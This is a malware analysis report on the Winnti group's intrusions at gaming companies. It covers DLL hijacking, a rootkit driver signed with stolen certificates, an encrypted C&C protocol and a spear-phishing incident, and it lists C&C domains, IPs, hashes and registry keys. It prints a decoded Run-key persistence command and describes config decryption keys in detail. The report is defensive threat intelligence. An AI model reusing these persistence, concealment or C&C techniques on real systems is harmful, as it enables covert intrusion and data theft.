Let 's look at an example .
During our investigation of an infection at a computer gaming company , we found that malware had been created for a particular service on the company 's server .
The malicious program was looking for a specific process running on the server , injected code into it , and then sought out two places in the process code where it could conceal call commands for its function interceptors .
Using these function interceptors , the malicious programs modified process data which was processed in those two places , and returned control back .
Thus , the attackers change the normal execution of the server processes .
Unfortunately , the company was not able to share its targeted application with us , and we can not say exactly how this malicious interference affected gaming processes .
The company concerned told us that the attackers ' aim was to acquire gaming `` gold '' illegally .
Malicious activity like this has an adverse impact on the game itself , tilting the balance in favor of cheats .
But any changes the Winnti team introduces into the game experience are unlikely to be very noticeable .
After all , maintaining a skillful balance is the main attribute of online games .
Users will simply stop playing if they feel that other players are using non - standard methods to create an advantage beyond normal gameplay or if the game loses its intrinsic competitiveness due to resources or artifacts appearing in the game without the developers ' knowledge .
At the same time , the attackers are keen for the game to remain popular ; otherwise , they would be unable to effectively turn all the time and effort of infecting a gaming company into financial gain .
Members of the Winnti team are patient and cautious .
Cyber - criminals have affected the processes of the online games from the infected companies and stolen money from them for years , but they have found ways of doing this without attracting attention to themselves .
Everything starts with a DLL .
The DLL mimics one of the standard Windows libraries , winmm.dll or apphelp.dll .
Since , in the vast majority of cases the samples that we detected disguised themselves as winmm.dll , we would like to fix this name for this malicious library at the end of this document .
Legitimate winmm.dll is a Windows system library that provides multimedia functions .
It is located in the % WINDIR % \System32 folder .
The attackers counted on this being a library providing basic system functions and hence the probability of it being loaded by some program is very high ( this is also valid for apphelp.dll ) .
For example , winmm.dll is loaded by explorer.exe , which is launched during operating system startup and is essential for Windows user interface .
The mechanism to start the malware is simple : if some benign application depends on Windows winmm.dll ( located in % WINDIR % \System32\winmm.dll ) but the evil twin library with the same name ( winmm.dll ) is located in the folder of benign application , the malicious library will be loaded instead of the system one .
Taking advantage of their control of an infected computer , the attackers place a malicious library in the % WINDIR % folder .
The same folder also contains explorer.exe .
This enables the attackers to ensure that the malicious DLL is loaded at system startup : explorer.exe loads the malicious winmm.dll from the % WINDIR % folder as soon as it launches during system startup .
But how can a program which depends on the original library work correctly if a malicious winmm.dll is loaded instead of the original library ? Very easy : the malicious library is designed to work as a proxy for the original winmm.dll from the % WINDIR % \System32 folder .
The cyber - criminals did not reinvent the wheel to make sure that everything works properly .
They relied on a tool known as AheadLib , which was developed by security researchers to analyze malware .
This program , which is designed to facilitate the analysis of malicious libraries , was created by a Chinese developer employed by an Asian anti - virus vendor .
The program accepts a DLL on input and produces a C code which hooks the functions included in the library .
The C code is compiled back into a DLL , which can then be used as a proxy and provide flexible way to analyze behavior of malicious file .
The flexibility of this tool allows to customize the logics of malicious application during analysis and overload functions code to provide some debugging output .
Some code can be added to display parameters of the hooked functions in order to find out which values are passed to the original functions when they are called .
This method is used in so called dynamic analysis of malicious applications .
Ironically , the malware authors have found this to be a convenient application for creating malicious proxy- libraries .
They specified a system library ( winmm.dll ) as a parameter for AheadsLib tool and produced a source code template to create a proxy DLL – in the form of C file .
By overloading some functions with the malicious payload , the attackers created a complete piece of malware that included all the features of the system DLL .
Strangely , the attackers kept the code for AheadLib debug messages in the early versions of their malware ( marked with red in the screenshots above ) .
These strings can also be found in compiled malicious binaries : Later , these fragments were removed from the C file generated by AheadLib .
The winmm.dll malicious library maintains another library in its body , which is decrypted and loaded into the process memory without creating any files on local disk .
According to file version info the original name of this library is `` PlusDLL.dll '' .
This is the platform 's main control component .
When the additional DLL has been properly allocated in the memory , winmm.dll passes control to it with a parameter – a string which contains bot settings .
The settings string , in encrypted form , is also located in the winmm.dll body – after the magic word `` PLUSUNIT '' .
After decryption , the string contains the following : url = lp.gasoft.us:80|ver=1018|tag=33|group = lp80wi Apparently , when the Winnti malware managed to get into focus of security researchers : the authors made modifications of the methods used to store these initial settings .
In some samples , the settings were hidden even in the executable file 's header : In other variants , the ' PLUSUNIT ' magic string was modified : The PlusDLL library has an embedded driver .
The driver is stored in % WINDIR % \System32\ < drivername.sys > file , registered as a service and started by NtLoadDriver system API function .
Immediately after that , the driver 's file is removed , as well as all the registry entries created during service registration .
The executable preserved the original driver names which are `` PortLess '' and `` PointFilter '' ; however , the driver files used during infection are saved as `` sp1itter.sys '' and `` acplec.sys '' .
The purpose of the driver is to hide network connections established by the malware .
For example , if the user decides to check a list of established connections ( e.g. , using the ' netstat –a ' command or the tcpview program ) while the bot is communicating to the control center , the driver will protect and hide the malware connections .
This approach is used by many rootkits on the Windows platform .
The driver uses an interesting method to get the list of addresses to protect connections with .
This information is available in the PlusDLL control library , which normally operates in the context of the explorer.exe process when the infection is active on the computer .
The address information is sent from the user space ( from PlusDLL ) to the kernel space , where the driver works , via call to NtSetQuotaInformationFile API function .
During initialization , the driver hooks the NtSetQuotaInformationFile function : Every time the function is called , the driver checks its parameters : to be precise it is HANDLE FileHandle and PVOID Buffer parameters .
The FileHandle parameter holds a descriptor of the partition on the hard drive where the function is expected to set disk quotas .
The Buffer parameter is a memory buffer with information of new quotas to be set .
The driver checks whether the value of the FileHandle parameter is equal to minus two .
When the system calls the NtSetQuotaInformationFile function to actually change the quotas , the descriptor must be associated with one of the disks .
Normally such descriptors in the Windows system are positive integers which obviously means that it can not be equal to minus two .
The negative value is set by the PlusDLL library in order to make the driver detect that the NtSetQuotaInformationFile function was called by that library .
When calling NtSetQuotaInformationFile , PlusDLL sends information about the network addresses to be protected by the driver via the Buffer parameter .
If FileHandle is not equal to minus two , the hook function in the driver passes control to system 's original code of NtSetQuoataInformationFile API function and everyhin works as it should be on an uninfected system .
Note that 64-bit versions of Windows do not allow unsigned drivers to run .
The malicious driver 's 64-bit versions were signed using stolen certificates .
During the time that we have been tracking the Winnti group , we found 11 certificates that were used to sign the malware used by the group ( not necessarily drivers only ) .
Ten of them belong to various companies in the gaming industry .
As mentioned above , the PlusDLL library is a control module .
Let 's look at how the cybercriminals implemented the transition to perform the malicious DLL 's main tasks .
They could have simply called an appropriate function directly or created a separate thread in which to execute it , but for some reason they resorted to a trick : the code of the SetWindowStationUser function in the user32.dll library was modified .
After modification , the function 's first command became jmp < addr > , where < addr > is the address of the function in the PlusDLL library which implements the malicious library 's main features .
Immediately after this modification , a thread is created ( CreateThread ) executing code starting from the SetWindowStationUser function address .
As a result , when control is eventually passed to this function , the inserted command jmp < addr > returns control back to the PlusDLL code .
The same method is used to execute two more functions in the PlusDLL library .
One of them is used to initialize network routines ; the other executes procedures terminating the malicious program at the very end .
The only difference is that instead of SetWindowStationUser , the code of two other functions from user32.dll is modified – EndTask and WinHelpW , respectively .
It is likely that this was done in order to hide the real addresses of functions in PlusDLL in case its code was analyzed based on its execution logs using an automatic system ( sandbox ) that looks at all function calls .
If this trick is used , an execution log would only show threads launched from the addresses of the functions SetWindowStationUser , EndTask and WinHelpW , which could potentially confuse researchers .
Another possibility is that this is an anti - emulation feature .
Perhaps the emulators built into some anti - virus products are unable to cope with these ' leaps ' – in this case , emulation will not result in the execution of malicious functions , which also suits the cybercriminals ' purposes .
So what does PlusDLL control ? It turns out that the target functionality is implemented in different files .
Each file provides a specific remote control feature and is downloaded from the attackers ' server every time the system starts up .
These files are not saved on disk or in the registry but are loaded directly into the memory .
At the very start of the operation , after launching the driver , PlusDLL collects information about the infected system .
A unique identifier for the infected computer is generated based on information about the hard drive and the network adapter 's MAC address , e.g. , TKVFP - XZTTL - KXFWH - RBJLF - FXWJR .
The attackers are interested primarily in the computer 's name , the program which loaded the malicious library , as well as information about remote desktop sessions ( session name , client name , user name and session time ) .
All of this data is collected in a buffer , which is then compressed and sent to the attackers ' control center .
The buffer may look like this : In reply to this initial message from the bot , the control center sends the list of available plugins .
Plugins are DLL libraries that provide specific remote control functions .
Upon receiving the list of plugins , the bot downloads them , allocates them in the memory and passes control to these libraries .
Different C2 servers could push different plugins .
In total we have discovered eight functional libraries : These plugins form the core toolkit which is used by the perpetrators during attack .
As you can see , the cybercriminals use an entire inventory of malicious tools to effectively control the remote computer .
Moreover , they have taken measures to conceal their activities : the plugins do not explicitly appear anywhere except in the computer 's memory ; they do not get saved to the hard drive ; the driver is deleted immediately after launch ; all traces in the registry that could indicate this launch get deleted .
Only the initial DLL remains on the disk that kick starts the entire process and contains an encrypted version of PlusDLL which is the control DLL .
One of the weak points in this architecture is that the driver does get saved to the hard drive before it launches , so anti - virus products can detect the emergence of this file .
The situation is further exacerbated by the fact that the malicious drivers may be signed ( although not all drivers in the Winnti samples that we detected were in fact signed ) .
An unsigned driver in itself does not have the means to counter antivirus products and its code can be easily recognized as malicious , whereas signed drivers stand a better chance of remaining undetected by antivirus products : certain anti - virus products consider properly signed programs legitimate by default , so as to minimize the chances of false positive responses .
Kaspersky Lab 's products detect the malicious programs described above under the following verdicts : The initial DLLs winmm.dll and apphelp.dll , the PlusDll.dll control DLLs , and functional loadable modules ( CmdPlus.dll etc .
The drivers sp1itter.sys and acplec.sys are detected as Rootkit . Win32.Winnti or Rootkit . Win64.Winnti .
The data transmitted during the communication between the bot and the C & C server , naturally , do not manifest themselves in any explicit form in online data traffic .
Since an active remote control practice can generate substantial traffic , cybercriminals compress communication data with the algorithm LZMA , though they do not include the appropriate header inherent to this algorithm .
The data is transmitted over the TCP protocol .
The samples that we analyzed established connections between C & C servers and ports 53 , 80 and 443 .
This port selection is not surprising : they are associated with the protocols DNS , HTTP and HTTPS respectively .
All three are routinely used in everyday operations , so they are enabled under most firewall policies .
Besides , large amounts of data typically pass through these ports ( with the possible exception of port 53 ) , which makes it easier for the malicious traffic to remain inconspicuous .
Although the ports are associated with certain protocols , the actual content of the traffic generated by the malicious program does not correspond to them .
Early versions of the Winnti platform exhibited the following traffic structure when communicating with C & C : each block of transmitted data started with the magic number 0xdeadface , followed by the number of blocks ( in a DWORD ) , then the hash of the transmitted block ( 8 bytes ) , the size of compressed data ( DWORD ) , the size of source data ( DWORD ) and , finally , the actual compressed data .
This is where another weak point of the Winnti family of backdoors becomes apparent .
With this data structure , malicious network traffic could easily be spotted by , for example , the magic number 0xdeadface .
The cybercriminals probably lost control over victim computers fairly frequently as corporate system administrators identified the intrusion by the unique headers in data packets with the help of IDS / IPS systems , and cleaned their networks .
In 2011 , new versions of Winnti backdoors appeared that , while still based on the same platform , started to use an updated protocol which included extra encryption to communicate with C & C , so the transmitted data no longer had static marks in them .
Prior to encryption , the data has the following structure ( very similar to the earlier format ) : the first 4 bytes are taken by the magic number 0xaced1984 , then a DWORD of data packet description , the next DWORD carries a zero value , 8 bytes of the hash of the transmitted block , then a DWORD with the size of the compressed data , a DWORD with the size of the source data and then the actual compressed data : Then the data is encrypted with regular XOR with a random DWORD size value , and in this form transmitted to the C & C .
Knowing that the first four bytes in the source data must represent the value 0xaced1984 , it is easy to restore the key for the XOR operation when the data were encrypted .
This is how the above data ( the XOR value was 0x002a7b2e ) looked when it was intercepted in network traffic : Since the encryption key ( the value with which the source data are encrypted with the XOR operation ) is different each time a fragment of data is transmitted , no more static unique labels can be found in the network traffic which would quickly identify the transmitted data as belonging to the Winnti backdoor .
Employing this fast , basic method , the cybercriminals have made it much harder to expose their programs ' traffic .
Whichever protocol is used ( with or without extra encryption ) , the workflow of communication between the bot and the C & C stays the same at the initial stage of operation : ● The bot sends the first data block , thus signaling itself ; ● In response , the C & C sends back the list of available plugins ● The bot starts to download plugins , sending one request at a time to download each plugin ● The C & C sends the requested plugin ● The bot sends a message that the plugin has arrived .
We should note here that , to expedite data downloading , the creators of this platform have quite skillfully implemented asynchronous data transmission in their protocol .
For instance , the message that the bot has received the first plugin may only arrive at the C & C when nearly all the plugins have been already sent to the bot .
Having downloaded the malicious payload , the bot deploys the plugins in the memory and initializes them .
Now it 's all set for complete remote control over the victim computer , and the bot switches to standby mode , waiting for the operator to connect and maintaining communication with the C & C by sending `` empty '' messages every 15 seconds or so .
Apart from supplying the plugins , no more automatic actions are performed by the C & C : all of the work to examine the infected computers is done manually by the attackers .
Please note , that the following is published with approval from one of the attacked companies which preferred to remain anonymous .
The real company name was replaced with `` CompanyXYZ '' or simply `` XYZ '' .
On 21st September 2012 , a Security Officer of CompanyXYZ contacted Kaspersky Lab and reported a cyber - attack incident .
Anomalous activity was spotted at one of the corporate servers .
One of the employees noticed a suspicious directory on the server which was created under his account .
The folder had a large archived file with information that was regarded as company 's intellectual property .
The anomalies were also confirmed in the network traffic by monitoring software .
Several suspicious network connections were established from several computer systems , including network domain controllers , to IP addresses which were not associated with any corporate resources or any other known trusted networks .
The suspicious connections were established on ports 443 and 53 .
Below is the list of reported IP addresses : 211.60.126.164 ( Seoul , South Korea ) 113.196.70.169 ( Taipei Taiwan ) The security officer at CompanyXYZ did an on - site analysis and managed to locate the process which initiated the suspicious connections using SysInternals Process Explorer tool .
The connections were initiated by a system process ( svchost.exe ) .
A full process dump using Process Explorer was made and shared with Kaspersky Lab .
Our team immediately started searching for malware in the provided process dump .
A next day , one more dump of svchost.exe from another presumably infected machine was provided .
We also received an IP address and port that was spotted in the suspicious connections coming from infected machines : 188.120.246.88:80 ( Russia ) .
Quick search through the dumped processes revealed IP addresses mentioned by the company 's security officers .
The memory was most likely dynamically allocated on process heap and used as a temporary storage of resolved domain name .
That is why we had to find another indicator of malicious module related to those IP addresses .
We initiated a port scan of the suspected hosts in parallel to memory analysis .
Below is the result on the time of scanning : The server was running Windows Terminal Service or was used as a proxy linked to some Terminal Server .
Establishing connection via RDP client usually reveals default system locale which is used on welcome screen .
Below is what we found upon connection : Checking one of IP addresses on robtex.com brought two possible domain names : One of these domains was found in the memory of dumped svchost process .
Besides that , several other domain names were discovered in the same memory block : service.interdriver.net service.googlefiles.net service.dell-support.org service.hp-supports.com Next step was to locate the nearest PE header in the memory of svchost and extract the executable module .
After fixing alignment of the sections the file was ready for further static analysis .
Date and time from PE header showed that the executable was prepared about a year before current attack was revealed : TimeDateStamp : `` 2011 - 10 - 13 07:21:50 '' The executable was a 64-bit application which means that the attackers had already known that CompanyXYZ used 64-bit systems .
The IP address 188.120.246.88 , which was seen in suspicious connection was also checked .
Connecting to the port 80 of that address with simple TCP client displayed an HTTP GET request : GET /G - Content_XYZ.rar HTTP/1.1 Accept : * / * Cache - Control : no - cache Connection : Keep - Alive Host : 127.0.0.1:81 Pragma : no - cache Range : bytes=23021988299 - 27335921161 Referer : http : //127.0.0.1:81 User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV1 ; .NET
That is probably done by the attackers ' tunneling setup which established a TCP connection with some local web server within the company network and an external host that received the stolen data .
According to the request , the attackers were downloading a file called G - Content_XYZ.rar , which seems to be an archive of over 25Gb long .
The transfer process was instantly interrupted by Security Officers of the company .
The embedded configuration shows some file names .
Another interesting piece of data was in a short string `` xyz '' , which probably refers to the attack campaign name and was defined by the attackers , who deliberately put that name to tag the malware .
The word `` xyz '' most likely stands for the campaign name which comes from the attacked company 's name `` CompanyXYZ '' .
That was the first evidence that we were dealing with a well - prepared targeted attack against CompanyXYZ .
From our previous experience , we have seen several targeted attacks against gaming companies and some of them were also tagged after the name of the companies .
In all those attacks there was a recognizable pattern of the attackers : they always used third - level domain names for the command and control server of the malware while second - level domain name usually resolved to 127.0.0.1 or was a public DDNS domain .
A quick check confirmed that this tactical pattern was present in this case as well .
Since then , we believed that it is the same attackers we already knew about .
This group of attackers was internally labeled `` Winnti '' by one of our researchers , who named it after one of the very first discovered executable malicious modules .
As soon as we discovered additional configuration , secondary domain names and IP addresses that could be used to control the infected hosts , we instantly reported it to the CompanyXYZ 's Security Officer , who instantly adjusted network firewall rules to block all connections to the attackers ' hosts .
Assisted remote system analysis of another infected machine resulted in discovery of C_20100.NLS file in the Windows system directory and a reference in the system registry to start malicious module as system service : HKLM\System\CurrentControlSet\services\Nwsapagent\Parameters\ ServiceDll = C : \Windows\system32\c_20100.NLS ServiceMain = StartMain ServiceDllUnloadOnStop = 1 Date of registry key creation was the first discovered time of the attack ( however , we found an earlier date later ) : Thu Sep 6 04:26:19 2012 Malicious service registry settings were hidden by a rootkit module , however it helped to identify an infection as the registry key name was the same on all the affected computers .
Simple creation of a key named HKLM\System\CurrentControlSet\services\Nwsapagent could fail if the system was infected .
The rootkit module protected the registry key , but it did n't protect the executable module stored on the hard drive .
It was possible to rename c_20100.NLS file , reboot the machine and clean the registry .
Alternative and even more reliable method was to reboot into Windows Safe Mode , clean the registry key and delete the c_20100.NLS file .
This method was used by company 's System Administrators to find other modules that were not in c_20100.NLS .
Since the infection was located and cleaned , the next step was to locate the breach used by the attackers to penetrate the network .
Security Officers of the company suggested to start checking from a distinct host they have suspected .
The host ( lets call it Machine # 3 ) belong to an employee without network administrators rights .
It was known that it had connected to the attackers ' IPs like the server systems .
The affected company 's security officers obtained a copy of the hard drive of the suspected machine and provided a remote access to the disk image .
Browsing through the directory structure based on the suspected and adjacent dates of infection ( 01 - 06 September 2012 ) revealed a couple of suspicious files that could have been related to the attack : C : \RECYCLER\en.exe Type : PE file Created : 2012 - 09 - 06 04:08:53 UTC Size : 405504 MD5 : cf119a66d4c3e2355c1ec4ac316a7130 C : \WINDOWS\system32\drivers\tcprelay.sys Type : PE file ( native ) Created : 2012 - 09 - 05 17:27:04 UTC Size : 99912 MD5 : 0b105cd6ecdfe5724c7db52135aa47ef Preliminary analysis of tcprelay.sys proved that it was a malicious file which had another encrypted executable file embedded in it .
This gave an even earlier suspected timestamp of infection : 2012 - 09 - 05 17:27:04 UTC or 2012 - 09 - 05 20:27:04 ( local system timezone , UTC+3 ) At the time of check there was no reference in the registry that was linked to tcprelay.sys , perhaps due the fact that system administrators had already cleaned the registry .
This was confirmed by a file in local Administrator 's Desktop folder : C : \Documents and Settings\Administrator\Desktop\1.reg ( created on 2012 - 09 - 24 12:44:07 UTC ) The file had an exported registry data , which had been removed from the registry during system cleanup on 24th September 2012 .
Here is the original contents of the registry key ( HKLM\SYSTEM\CurrentControlSet\Services\tcprelay ) before it was removed : Once the infection on the machine was confirmed we started looking for the origins of the malicious files .
From our previous experience of Winnti gang tactics , we knew that they are keen on sending targeted emails with attached executables .
Security Officers helped us check all the emails stored in local Outlook database file on suspected dates of infection , however that did n't reveal anything suspicious .
We have also found system event log files which were copied and analyzed .
Event logs had records of tcprelay service start timestamps which confirmed the discovered date of infection .
User SID corresponded to the local user account according to the registry .
Tcprelay service first start time from the Event Log The Machine # 3 had an anti - virus program installed .
Checking detection logs of the anti - virus on the suspected date of infection ( 05.09.2012 ) showed that there was a single detection right before tcprelay service first start .
We recovered the PDF document called `` Transmission with Steps , Realited and Compressed.pdf '' from the anti- virus quarantine and prepared to find an exploit inside .
The PDF had a lot of obfuscated JavaScript code inside , however we believe that it was not related to the original infection of the system .
It was clean and the anti - virus detected it by mistake , probably because of some suspicious obfuscated JavaScript code .
The JavaScript code inside the PDF was used to process an interactive form inside the PDF and support dynamic interactive 3D model embedded in the document using Adobe 3D technology .
After that , we checked the infected machine 's browser history .
The Internet Explorer history log files showed that the user was reading email right before the infection of his machine .
With that in mind , we analyzed the Outlook local database again .
This time we used several techniques to recover emails that were deleted from the Trash folder .
This helped to partly recover a message which arrived on the day of infection .
The text of the message supposed to contain an attachment , however the attachment and MIME headers of the email were completely lost and could n't be recovered .
However , it was clear that the email was a targeted attack against the employee of the company .
It was sent from companyxxyz @ 163.com and replaced `` From '' field in the email body which made it look like a legitimate email in the list of messages in Outlook .
We discovered a Windows prefetch file in the system directory , that was created when the malicious attachment was opened .
The timestamp correlates with the time of infection .
C : \WINDOWS\Prefetch\CompanyXYZ EMPLOYEE SALARY ADJ-1AF9D56A.pf Time of creation : 2012 - 09 - 05 19:52:00 ( local timezone , UTC+03 ) Unfortunately , the prefetch file format is proprietary and there is nothing interesting in those files , except the original executable file name .
Full path of the malicious executable that infected the first computer in the company was : C : \Documents and Settings\ < Username > \LocalSettings\Temp\RAR $ EX00.156\CompanyXYZ EMPLOYEE SALARY ADJUSTMENTS EBOOK.EXE According to the file path , this executable was a part of an archive , which was opened with WinRAR installed on the system .
Upon discovery , we requested the Security Officers to provide us with full MIME as well as to check who else may have received the same message .
The check discovered series of emails sent to several publicly known email addresses .
In all cases the text message was the same as shown above , however sent from different mailboxes .
The Return - Path MIME filed seemed to have the original email addresses of the attackers : companyxxyz @ 163.com company.xyz @ gmx.com The attackers used the same IP to send out emails : 118.142.11.114 inetnum : 118.140.0.0 - 118.143.255.255 netname : HGC descr : Hutchison Global Communications country : HK person : ITMM HGC nic - hdl : IH17-AP e - mail : hgcnetwork @ hgc.com.hk address : 9/F Low Block , address : Hutchison Telecom Tower , address : 99 Cheung Fai Rd , Tsing Yi , address : HONG KONG phone : + 852 - 21229555 fax - no : + 852 - 21239523 The emails we checked had the same attachment of 96782 bytes named `` Salary adjustments.zip '' .
There was only one file inside ZIP archive , called `` CompanyXYZ Employee Salary Adjustments Ebook.exe '' .
Full details about this application are provided further down in current report .
To summarize , the targeted attack started from an email sent at 05.09.2012 19:12 ( UTC+03 ) .
It resulted in system infection at 05.09.2012 19:52 ( UTC+03 ) .
Size : 96782 MD5 : 1b56416fefa2d2c863f3b46dfb6dc353 Location : targeted attack email message attachment Creation time ( author 's timezone ) : 2012 - 09 - 05 14:29:10 This file is just a container for `` CompanyXYZ Employee Salary Adjustments Ebook.exe '' .
Size : 122880 MD5 : 6ef66c2336b2b5aaa697c2d0ab2b66e2 Location : `` Salary adjustments.zip '' Creation time : unavailable Link time ( UTC ) : 2012 - 07 - 21 18:50:18 Internal name : FlashUpdate . EXE This application is a wrapper for another embedded executable modules .
It serves as a dropper of malware .
Notable fact : this application has a resource section inside and the default locale is set to Chinese Simplified .
The file creates three long binary data registry keys , two of which are encrypted executable modules and one encrypted config from the body of the original dropper .
These values are encrypted with simple 1-byte XOR .
Sysinfo config module is used by sysbin01 .
Apparently it starts with the company name and has three domain names , one of which is most likely used to check Internet connectivity ( update.microsoft.com ) .
Sysbin01 module is a loader component .
It creates several threads running various jobs .
We checked the system but could n't find < ComputerName > .ax
File name : C : \Documents and Settings\ % User % \Local Settings\Temp\ % ComputerName % _ p.ax File size : 2660 Creation time ( UTC ) : 2012 - 09 - 06 06:22:42 MD5 : unavailable ( the system went offline before we discovered the filepath ) .
File name : C : \Documents and Settings\ % User % \Local Settings\Temp\uid.ax File size : 16 Creation time ( UTC ) : 2012 - 09 - 06 05:03:06 MD5 : unavailable ( the system went offline before we discovered the filepath ) .
According to the code that loads < ComputerName > .ax
It reads the configuration from the registry and connects to the C & C servers specified in the config via direct tcp connection or via proxy that is fetched from the the settings of locally logged in user profile .
The config had the following C & C : tank.hja63.com .
It sends a `` POST / < HEXNUMBER > '' request with User - Agent `` lynx '' , the data after HTTP header is just `` AA '' , expected answer is also `` AA '' .
This thread also creates % TEMP % \uid.ax and stores current system unique ID , which is generated by CoCreateGuid system API ( 16 bytes ) .
It is able to receive and save data from the C & C server to a file .
It also monitors windows of explorer.exe and copies textual data from password fields if the user types in , stolen data is saved to a file first .
After all threads are launched , the main thread waits for termination of Sysbin01.thread # 3 , which is created first and then exits .
There is an embedded DLL file according to Figure 15 in sysbin02 .
If the system has a running process named `` 360tray.exe '' , then the embedded file is stored in % SYSTEM % \MFC42LOC.DLL , then copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp and runs a new process from that location via WMI Win32_Process . Create method .
If the system has a running process named `` bdagent.exe '' , then it copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp , decodes an embedded Base64 string and executes .
The string has the following text after decoding : reg add `` HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run '' /v FlashUpdate /t REG_EXPAND_SZ /d `` '' '' '' % APPDATA % \FlashUpdate.exe '' '' '' -update activex '' /f The module also saves current module file path to the registry in the following key location : HKCU\Software\Classes\path Next it patches the tmp file with two dword `` AAAA '' values which looks like corruption of embedded encrypted sysbin modules inside .
The meaning of this action is currently unclear .
Then it moves Flash.tmp file to FlashUpdate.exe by and starts a new process from new location .
Finally , if there is not `` qqpctray.exe '' process running , and this seemed to be the case for the analyzed system , it copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp , patches the new file and increases its size by adding system explorer.exe file contents to the resource section `` RC Data '' 20 times .
The purpose of this is to make the new executable look like the real update service of Adobe Flash , it simply stuffs the file with executable code of another application .
Then it moves the file to new location % APPDATA % \FlashUpdate.exe , saves new module file path to the registry in the following key location : HKCU\Software\Classes\path and starts a new process from there .
Size : 15847156 MD5 : 5778178a1b259c3127b678a49cd23e53 Location : C : \WINDOWS\system32\c_20100.NLS Creation time ( UTC ) : unavailable Link time ( UTC ) : 2011 - 09 - 16 13:23:34 c_20100.NLS works in two modes .
The first mode is a load as a dynamic library and the second is a launch as a service .
Both branches have the same core functionality .
This module is a universal executable code loader with no embedded payload .
Its main purpose is to connect to the C & C server , download and store the encrypted payload in the system registry .
It is also responsible for loading , decrypting and running the payload module from the registry after system restart .
This ciphered block resides at the very end of the file of this malicious program and is decrypted in the beginning of execution .
Structure of block : The malicious program XORs the magic number with a hardcoded value 0x19860609 , converts a resulted value into a HEX - string and uses that string as a key for RC4 cipher algorithm .
In this case string - key represents `` 00000000 '' because of the magic number is equal to the hardcoded XORing value .
With that key malicious program decrypts ( RC4 ) ciphered archive .
The archive has the following data : Custom LZ - like compression algorithm resembling was used to pack initial settings .
After unpacking the following data appears : The malicious program tries to read registry value `` SrvCode '' by registry path : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion .
That value is expected to contain ciphered with RC4 data .
To decrypt it program uses 2nd integer of initial settings ( in this case 0x3514 ) XORed by hardcoded byte 0x12 .
Result is converted into a HEX - string and is used as RC4 key for further decryption ( here it is `` 00003506 '' ) .
That registry value appears if this malicious program had already worked on the system and received data from the C & C server in the past .
Content of `` SrvCode '' poses a ciphered executable which should be loaded into the memory and run .
If `` SrvCode '' is not found malware makes attempts to connect to one of the specified C & C servers .
Initial settings define the type of C & C format .
Byte at offset 0x24C stores the C & C type value : 0x00 : the malware uses 4 URL - based C & Cs placed at 0x4C , 0x8C , 0xCC and 0x10C offsets .
By all appearances these are public resources ( forums , blog platforms and so on ) where the attackers leave messages with specially crafted content for a bot .
If connection fails , the malware tries another approach .
If connection fails the malware tries another approach .
If URL - based scheme is used then malware loads a web - page by specified in settings URL .
The target text has to begin and end with special hardcoded delimiters : `` B9273C17 '' – start , `` B6A74634 '' – end .
The malware reads contents of the webpages until it finds a proper page with delimiters .
If found , the malware takes the text between delimiters and treats it as data of hex string , converts it to the binary data and decrypts resulted data using RC4 algorithm with hardcoded key `` rtyr_45_trf '' .
For example : '' B9273C17E67024277AE02E2A8A780B243C0BCA88FE85A1B6A7463 '' , The data between delimiters : '' E67024277AE02E2A8A780B243C0BCA88FE85A1 '' , It is converted into binary : 0xe6 0x70 0x24 … 0xa1 and this buffer is decrypted with RC4 key `` rtyr_45_trf '' .
Result is a host and port of C & C : `` nx2.intercpu.com:25 '' .
If the host - port schema is used then malware simply connects to the hardcoded C & C servers directly .
Once a working C & C server is found the malware sends specially crafted ciphered buffer to via TCP / IP .
On request from a bot a C & C server replies with several blocks of data described below : 1st block 0xC bytes of header : 0x1000010 , 0x1000010 , < reserved 4 bytes > .
Resulted lowest byte is used to XOR unpacked data .
Word at offset 0x4 ( here , 0x5544 ) poses a checksum of unpacked data which should correspond with actual received content .
Value at marked place at 0xC offset ( in example picture it is dword 0xFFEEDDCC ) represents a size of next block of data to be received .
That data will pose an archive , hence this value represents a size of packed data .
Being received , unpacked and decrypted , data is ciphered again with RC4 and stored into `` SrvCode '' value of registry by mentioned above registry path .
The eceived data is processed as an executable file to run .
The malware places the executable in memory , prepares for running and makes call to the entry point of the new code .
Then it waits when following event will be triggered : Global\D5ACF9F6-C8B3 - 47d1 - 9768 - 57162E1F5FDB When triggered , the malware finishes execution .
During the process of finishing it deletes registry value `` SrvCode '' along with values `` DrvCode '' and `` KeyCode '' from the same registry path although this malware was not creating them .
Size : 99912 MD5 : 0b105cd6ecdfe5724c7db52135aa47ef Location : C : \WINDOWS\system32\drivers\tcprelay.sys Creation time ( UTC ) : 2012 - 09 - 05 17:27:04 Link time ( UTC ) : 2011 - 12 - 21 13:55:03 This file is a Microsoft Windows native application , which is loaded as a driver and had a valid digital signature in 2012 .
The certificate was issued by LivePlex Corp , which can be found online by searching for the company name .
One of their webpages is here : http : //www.linkedin.com / company / liveplex When the driver is loaded it decrypts an embedded DLL file , which is immediately injected into the address space of services.exe process .
Then the driver sets up some rootkit functionality to hide TCP connections by patching the system tcp / ip driver .
The injected DLL was called s.dll at the time of compilation and is yet another module for analysis .
Size : 77825 MD5 : 1716889fcee461e7cde5128c14d206cb Location : inside tcprelay.sys Creation time ( UTC ) : 2012 - 09 - 05 17:27:04 Link time ( UTC ) : 2011 - 03 - 01 09:07:12 This opens system event named `` 401d - b49a-93cf7a18e5b3 '' and sets event to fired state if it exists .
The code checks for proxy server configuration by impersonating a logged in user and fetching settings from the registry .
It can work both with Socks and HTTP proxies .
The module attempts to connect to the list of 8 domains , consisting of the following command and control servers ( some of them are used more than once ) : a1.googletrait.com a1.nexongame.net a1.reegame.net mail.nexongame.net It automatically looks for open C & C ports in the following order 53,443,8080,25,80,3690,1433,80 .
During connection over HTTP proxy it uses the following User - Agent string : `` MyApp/0 '' .
The application is linked with libmysql.dll and Zlib ( v.1.2.3 ) .
Current Zlib version is 1.2.7 and was released on 2nd May 2012 , while version 1.2.3 seems to be released in July 2005 .
Zlib version 1.2.4 was released on March 2010 , so the original module was probably designed somewhere after July 2005 and before March 2010 .
Then it collects system information , which includes the following : Host name OS Service Pack version System default language ID and Code page List of local drives with free space Internal hardcoded identifier ( `` 12 - 21 '' ) Process commandline Logged in user name System directory path Amount of free system memory CPU name Terminal services port number The information is stored in a buffer that begins with hardcoded header magic number : 0xDF1F1ED3 .
